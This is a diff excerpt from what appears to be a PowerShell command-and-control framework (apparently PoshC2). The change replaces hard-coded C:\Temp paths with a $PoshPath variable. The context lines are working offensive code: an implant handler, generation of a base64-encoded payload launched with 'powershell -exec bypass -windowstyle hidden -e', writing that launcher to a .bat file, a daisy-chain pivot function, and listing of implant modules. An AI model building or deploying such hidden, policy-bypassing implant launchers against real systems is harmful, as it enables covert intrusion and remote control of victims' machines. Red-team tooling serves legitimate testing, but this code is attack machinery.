@@ -23,7 +23,7 @@ function Implant-Handler
     # initiate defaults
     $Database = "$FolderPath\PowershellC2.SQLite"
     $p = $env:PsModulePath
-    $p += ";C:\temp\PowershellC2\"
+    $p += ";$PoshPath\"
     $global:randomuri = $null
     $global:cmdlineinput = 'PS >'
     $global:implants = $null
@@ -345,9 +345,9 @@ primer | iex
         $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
         [IO.File]::WriteAllLines("$FolderPath\payloads\proxypayload.bat", $payload)
-        [IO.File]::WriteAllLines("C:\Temp\PowershellC2\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
+        [IO.File]::WriteAllLines("$PoshPath\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
         Write-Host -Object "Payload written to: $FolderPath\payloads\proxypayload.bat"  -ForegroundColor Green
-        Write-Host -Object "Payload written to: C:\Temp\PowershellC2\Modules\proxypayload.ps1"  -ForegroundColor Green
+        Write-Host -Object "Payload written to: $PoshPath\Modules\proxypayload.ps1"  -ForegroundColor Green
     }
 function Invoke-DaisyChain {
 param($port, $daisyserver)
@@ -705,7 +705,7 @@ param
             if ($pscommand -eq 'ListModules') 
             {
                 $pscommand = 'fvdsghfdsyyh'
-                Write-Host -Object "Reading modules from `$env:PSModulePath\* and C:\Temp\PowershellC2\Modules\*"
+                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                 $folders = $env:PSModulePath -split ";" 
                 foreach ($item in $folders) {
                     $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
@@ -714,7 +714,7 @@ param
                         Write-Host $mod
                     }
                 }
-                $listmodules = Get-ChildItem -Path "C:\temp\PowershellC2\Modules" -Name 
+                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                 foreach ($mod in $listmodules)
                 {
                   Write-Host $mod
